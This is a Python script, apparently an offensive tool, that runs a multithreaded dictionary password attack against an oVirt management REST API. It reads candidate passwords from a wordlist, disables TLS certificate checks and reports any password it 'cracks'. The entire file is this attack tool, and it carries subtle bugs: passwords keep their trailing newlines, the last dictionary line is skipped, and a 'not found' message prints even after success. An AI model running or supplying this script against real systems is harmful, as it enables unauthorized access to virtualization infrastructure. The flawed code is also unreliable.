#!/usr/bin/python3
import linecache
import ovirtsdk4 as sdk
import argparse
import threading
import time

cracked = False
def ovirt_login_wrapper(url, username, password):
    return sdk.Connection(url=url,
                          username=username,
                          password=password,
                          insecure=True).test()

def passwd_dict_linecount(dic_file):
    return sum(1 for line in open(dic_file))

def range_tuples(num, divide):
    divide_list = list(range(1, num, int(num / divide))) + [num]
    return list(zip(divide_list[0:-1], divide_list[1:]))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-l', '--login', help='Login user')
    parser.add_argument('-d', '--dictionary', help='The password dictionary')
    parser.add_argument('-u', '--url', help='The rest api url')
    parser.add_argument('-t', '--threads', type=int, default=2, help='Threads numbers')
    args = parser.parse_args()
    threads_num = args.threads
    line_num = passwd_dict_linecount(args.dictionary)
    line_range_tuples = range_tuples(line_num, threads_num)
    def ovirt_crack(line_tuple):
        global cracked
        for line in range(line_tuple[0], line_tuple[1]):
            password = linecache.getline(args.dictionary, line)
            print("Trying password: %s" % password)
            if ovirt_login_wrapper(args.url, args.login, password):
                cracked = True
                print("The password is cracked: %s\n" % password)

    threads = [threading.Thread(target=ovirt_crack, args=(line_tuple,)) for line_tuple in line_range_tuples]
    for t in threads:
        t.start()
    global cracked
    while len(threading.enumerate()) > 1 and not cracked:
        time.sleep(1)
    for t in threads:
        t.join()
    print("password not found in dictionary\n")

if __name__ == "__main__":
    main()
